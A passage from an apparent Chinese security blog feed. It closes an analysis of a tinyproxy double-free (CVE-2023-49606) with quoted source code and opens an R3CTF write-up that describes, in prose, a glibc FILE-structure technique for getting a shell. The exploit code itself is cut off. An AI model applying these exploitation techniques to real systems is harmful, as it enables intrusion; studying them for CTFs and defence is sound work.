class=\"string\">&quot;Could not retrieve all the headers from the client&quot;</span>);</span><br><span class=\"line\">               indicate_http_error (connptr, <span class=\"number\">400</span>, <span class=\"string\">&quot;Bad Request&quot;</span>,</span><br><span class=\"line\">                                    <span class=\"string\">&quot;detail&quot;</span>,</span><br><span class=\"line\">                                    <span class=\"string\">&quot;Could not retrieve all the headers from &quot;</span></span><br><span class=\"line\">                                    <span class=\"string\">&quot;the client.&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">               update_stats (STAT_BADCONN);</span><br><span class=\"line\">               HC_FAIL();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       got_headers = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，显示利用 orderedmap_create 函数创建了一个哈希链表头，接着利用 get_all_headers 函数去把标头插入哈希链表中</p>\n<p>接着再检测是否存在上游代理，如果存在则是通过 connect_to_upstream 去通过上游代理连接目标服务器，否则是直接通过 tinyproxy 运行服务器去连接目标服务器</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">connptr-&gt;upstream_proxy = UPSTREAM_HOST (request-&gt;host);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (connptr-&gt;upstream_proxy != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (connect_to_upstream (connptr, request) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        HC_FAIL();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                connptr-&gt;server_fd = opensock (request-&gt;host, request-&gt;port,</span><br><span class=\"line\">                                               connptr-&gt;server_ip_addr);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (connptr-&gt;server_fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        indicate_http_error (connptr, <span class=\"number\">500</span>, <span class=\"string\">&quot;Unable to connect&quot;</span>,</span><br><span class=\"line\">                                             <span class=\"string\">&quot;detail&quot;</span>,</span><br><span class=\"line\">                                             PACKAGE_NAME <span class=\"string\">&quot; &quot;</span></span><br><span class=\"line\">                                             <span class=\"string\">&quot;was unable to connect to the remote web server.&quot;</span>,</span><br><span class=\"line\">                                             <span class=\"string\">&quot;error&quot;</span>, strerror (errno), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                        HC_FAIL();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                log_message (LOG_CONN,</span><br><span class=\"line\">                             <span class=\"string\">&quot;Established connection to host \\&quot;%s\\&quot; using &quot;</span></span><br><span class=\"line\">                             <span class=\"string\">&quot;file descriptor %d.&quot;</span>, request-&gt;host,</span><br><span class=\"line\">                             connptr-&gt;server_fd);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!connptr-&gt;connect_method)</span><br><span class=\"line\">                        establish_http_connection (connptr, request);</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来则是执行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (process_client_headers (connptr, hashofheaders) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                update_stats (STAT_BADCONN);</span><br><span class=\"line\">                log_message (LOG_INFO,</span><br><span class=\"line\">                             <span class=\"string\">&quot;process_client_headers failed: %s. host \\&quot;%s\\&quot; using &quot;</span></span><br><span class=\"line\">                             <span class=\"string\">&quot;file descriptor %d.&quot;</span>, strerror(errno),</span><br><span class=\"line\">                             request-&gt;host,</span><br><span class=\"line\">                             connptr-&gt;server_fd);</span><br><span class=\"line\"></span><br><span class=\"line\">                HC_FAIL();</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>process_client_headers 函数功能有两个，一个是处理特殊的标头信息，比如 Content-Length ，connection，proxy-connection，同时发送标头，二是当 Content-Length 大于 0 时候，读入 post 数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">process_client_headers</span> <span class=\"params\">(<span class=\"keyword\">struct</span> conn_s *connptr, orderedmap hashofheaders)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> *skipheaders[] = &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;host&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;keep-alive&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;proxy-connection&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;te&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;trailers&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;upgrade&quot;</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">int</span> i;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> iter;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">char</span> *data, *header;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 其它省略代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * See if there is a &quot;Content-Length&quot; header.  If so, again we need</span></span><br><span class=\"line\"><span class=\"comment\">         * to do a bit of processing.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        connptr-&gt;content_length.client = get_content_length (hashofheaders);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 其它省略代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * See if there is a &quot;Connection&quot; header.  If so, we need to do a bit</span></span><br><span class=\"line\"><span class=\"comment\">         * of processing. :)</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        remove_connection_headers (hashofheaders);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Delete the headers listed in the skipheaders list</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i != (<span class=\"keyword\">sizeof</span> (skipheaders) / <span class=\"keyword\">sizeof</span> (<span class=\"type\">char</span> *)); i++) &#123;</span><br><span class=\"line\">                orderedmap_remove (hashofheaders, skipheaders[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Send, or add the Via header */</span></span><br><span class=\"line\">        ret = write_via_header (connptr-&gt;server_fd, hashofheaders,</span><br><span class=\"line\">                                connptr-&gt;protocol.major,</span><br><span class=\"line\">                                connptr-&gt;protocol.minor);</span><br><span class=\"line\">        <span class=\"comment\">// 其它省略代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Write the final &quot;blank&quot; line to signify the end of the headers */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (safe_write (connptr-&gt;server_fd, <span class=\"string\">&quot;\\r\\n&quot;</span>, <span class=\"number\">2</span>) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Spin here pulling the data from the client.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">PULL_CLIENT_DATA:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (connptr-&gt;content_length.client &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                ret = pull_client_data (connptr,</span><br><span class=\"line\">                                        connptr-&gt;content_length.client, <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (connptr-&gt;content_length.client == <span class=\"number\">-2</span>)</span><br><span class=\"line\">                ret = pull_client_data_chunked (connptr);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，先是获取了 content_length.client，然后是通过 remove_connection_headers 去释放 connection 和 proxy-connection 标头，这里也就是漏洞函数</p>\n<p>remove_connection_headers 函数实现</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">remove_connection_headers</span> <span class=\"params\">(orderedmap hashofheaders)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> *headers[] = &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;connection&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;proxy-connection&quot;</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">char</span> *data;</span><br><span class=\"line\">        <span class=\"type\">char</span> *ptr;</span><br><span class=\"line\">        <span class=\"type\">ssize_t</span> len;</span><br><span class=\"line\">        <span class=\"type\">int</span> i,j,df;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i != (<span class=\"keyword\">sizeof</span> (headers) / <span class=\"keyword\">sizeof</span> (<span class=\"type\">char</span> *)); ++i) &#123;</span><br><span class=\"line\">                <span class=\"comment\">/* Look for the connection header.  If it&#x27;s not found, return. */</span></span><br><span class=\"line\">                data = orderedmap_find(hashofheaders, headers[i]);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!data)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                len = <span class=\"built_in\">strlen</span>(data);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                 * Go through the data line and replace any special characters</span></span><br><span class=\"line\"><span class=\"comment\">                 * with a NULL.</span></span><br><span class=\"line\"><span class=\"comment\">                 */</span></span><br><span class=\"line\">                ptr = data;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((ptr = <span class=\"built_in\">strpbrk</span> (ptr, <span class=\"string\">&quot;()&lt;&gt;@,;:\\\\\\&quot;/[]?=&#123;&#125; \\t&quot;</span>)))</span><br><span class=\"line\">                        *ptr++ = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                 * All the tokens are separated by NULLs.  Now go through the</span></span><br><span class=\"line\"><span class=\"comment\">                 * token and remove them from the hashofheaders.</span></span><br><span class=\"line\"><span class=\"comment\">                 */</span></span><br><span class=\"line\">                ptr = data;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (ptr &lt; data + len) &#123;</span><br><span class=\"line\">                        df = <span class=\"number\">0</span>;</span><br><span class=\"line\">                        <span class=\"comment\">/* check that ptr isn&#x27;t one of headers to prevent</span></span><br><span class=\"line\"><span class=\"comment\">                           double-free (CVE-2023-49606) */</span></span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j != (<span class=\"keyword\">sizeof</span> (headers) / <span class=\"keyword\">sizeof</span> (<span class=\"type\">char</span> *)); ++j)</span><br><span class=\"line\">                                <span class=\"keyword\">if</span>(!strcasecmp(ptr, headers[j])) df = <span class=\"number\">1</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (!df) orderedmap_remove (hashofheaders, ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"comment\">/* Advance ptr to the next token */</span></span><br><span class=\"line\">                        ptr += <span class=\"built_in\">strlen</span> (ptr) + <span class=\"number\">1</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">while</span> (ptr &lt; data + len &amp;&amp; *ptr == <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">                                ptr++;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">/* Now remove the connection header it self. */</span></span><br><span class=\"line\">                orderedmap_remove (hashofheaders, headers[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>remove_connection_headers 只会去释放 connection 和 proxy-connection 标头，看到这里其实就差不多看完了，明显 gg 了。</p>\n<p>后面就是通过 write_via_header 发送标头到目标服务器，释放非 connection  标头</p>\n<p>接着说通过 pull_client_data 读 post 数据，一边读，一边往服务端发送</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">pull_client_data</span> <span class=\"params\">(<span class=\"keyword\">struct</span> conn_s *connptr, <span class=\"type\">long</span> <span class=\"type\">int</span> length, <span class=\"type\">int</span> iehack)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> *buffer;</span><br><span class=\"line\">        <span class=\"type\">ssize_t</span> len;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        buffer =</span><br><span class=\"line\">            (<span class=\"type\">char</span> *) safemalloc (min (MAXBUFFSIZE, (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>) length));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!buffer)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">                len = safe_read (connptr-&gt;client_fd, buffer,</span><br><span class=\"line\">                                 max (MAXBUFFSIZE, (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>) length));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (len &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> ERROR_EXIT;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!connptr-&gt;error_variables) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (safe_write (connptr-&gt;server_fd, buffer, len) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                                <span class=\"keyword\">goto</span> ERROR_EXIT;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                length -= len;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (length &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (iehack) &#123;</span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                 * BUG FIX: Internet Explorer will leave two bytes (carriage</span></span><br><span class=\"line\"><span class=\"comment\">                 * return and line feed) at the end of a POST message.  These</span></span><br><span class=\"line\"><span class=\"comment\">                 * need to be eaten for tinyproxy to work correctly.</span></span><br><span class=\"line\"><span class=\"comment\">                 */</span></span><br><span class=\"line\">                ret = socket_nonblocking (connptr-&gt;client_fd);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ret != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        log_message(LOG_ERR, <span class=\"string\">&quot;Failed to set the client socket &quot;</span></span><br><span class=\"line\">                                    <span class=\"string\">&quot;to non-blocking: %s&quot;</span>, strerror(errno));</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> ERROR_EXIT;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">                len = recv (connptr-&gt;client_fd, buffer, <span class=\"number\">2</span>, MSG_PEEK);</span><br><span class=\"line\">        </span><br><span class=\"line\">                ret = socket_blocking (connptr-&gt;client_fd);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ret != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        log_message(LOG_ERR, <span class=\"string\">&quot;Failed to set the client socket &quot;</span></span><br><span class=\"line\">                                    <span class=\"string\">&quot;to blocking: %s&quot;</span>, strerror(errno));</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> ERROR_EXIT;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">                <span class=\"keyword\">if</span> (len &lt; <span class=\"number\">0</span> &amp;&amp; errno != EAGAIN)</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> ERROR_EXIT;</span><br><span class=\"line\">        </span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((len == <span class=\"number\">2</span>) &amp;&amp; CHECK_CRLF (buffer, len)) &#123;</span><br><span class=\"line\">                        <span class=\"type\">ssize_t</span> bytes_read;</span><br><span class=\"line\">        </span><br><span class=\"line\">                        bytes_read = read (connptr-&gt;client_fd, buffer, <span class=\"number\">2</span>);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (bytes_read == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">                                log_message</span><br><span class=\"line\">                                        (LOG_WARNING,</span><br><span class=\"line\">                                         <span class=\"string\">&quot;Could not read two bytes from POST message&quot;</span>);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        safefree (buffer);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">ERROR_EXIT:</span><br><span class=\"line\">        safefree (buffer);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>handle_connection 函数的后面部分，则是通过 process_server_headers 函数读目标服务器的响应包发送到客户端，和上面分析过 process_client_headers 的差不多，就不继续详细分析了。</p>\n<p>整个框架比较简单，通过审计代码可以知道。</p>\n<ol>\n<li><p>是线程执行，因此是使用的线程堆，而在这些代码中，明显没有往堆上申请存放什么结构体，堆上很干净，ptmalloc 下，要攻击只能通过寻常 CTF 中打 ptmalloc 堆的方式。同时是使用完就释放，很难构造堆风水。</p>\n</li>\n<li><p>由于 1 讲到的线程堆使用后就释放，所以线程开始执行时，不会残留什么堆块，申请和释放堆块的操作只有标头处理时候会涉及，而 connection 和 proxy-connection 标头一定会在其它标头前面释放，并且 connection 和 proxy-connection 标头只有两个，那么无论如何，double free 时候，第一次 free 的堆块总是在 tcahce bin，因为我们无法去释放其它标头来堆满 tcache bin，所以是无法控制的 crash。</p>\n</li>\n</ol>\n<p>后面我试着 patch 成 libc 2.27_1.0 ，即使不会触发 double free 的错误，那么也会在后面直接 crash</p>\n<p>这一个漏洞比较有趣的一个点是，如果目标服务器返回的响应包如果带有 poc，也是可以触发 crash 的，因为 process_server_headers 和 process_client_headers 差不多，但是同样的，process_client_headers 执行完之后，标头申请的堆块会被释放，process_server_headers  执行时，堆的初始环境和 process_client_headers  是一样的，同样无法完成利用。</p>\n<p>当然可能是我比较菜，在 ptmalloc 高版本下没看到利用的可能，如果有大佬有想法，可以指教下。</p>\n",
            "tags": [
                "tinyproxy"
            ]
        },
        {
            "id": "http://example.com/2024/07/29/2024_R3CTF_part1/",
            "url": "http://example.com/2024/07/29/2024_R3CTF_part1/",
            "title": "2024 R3CTF patr1",
            "date_published": "2024-07-28T17:15:33.000Z",
            "content_html": "<p>​\t记得六月初打这比赛被暴虐，所以想着复现下，这次只发了四道，vmware 逃逸和 sysnology TC500 都已经做了一半了，本来是想把所有题目都复现完再发的，但是这周末有师傅找我一起看 paloalto 的洞，所以就没做了，白天要上班，晚上还有其它洞要复现，感觉最近时间内是没有时间继续完成了，等有时间了再做完 part2</p>\n<h2 id=\"Nullullullllu\"><a href=\"#Nullullullllu\" class=\"headerlink\" title=\"Nullullullllu\"></a>Nullullullllu</h2><p>这题是最简单的，在直接给 libc_base 的情况下，一次任意地址写 \\x00 。</p>\n<p>直接修改 <em>IO_2_1_stdin</em> 的 <em>IO_buf_base 末尾为 \\x00 ，那么</em> IO_buf_base 就会指向 <em>IO_2_1_stdin</em> 的 <em>IO_write_base，接下来就是利用 getchar 函数触发写操作修改</em>  IO_buf_base <em>为</em> IO_2_1_stdout_ ，再次利用 getchar 函数触发写操作写 apple2 进 stdout ，printf 函数执行时候会触发 appl2 get shell。</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span 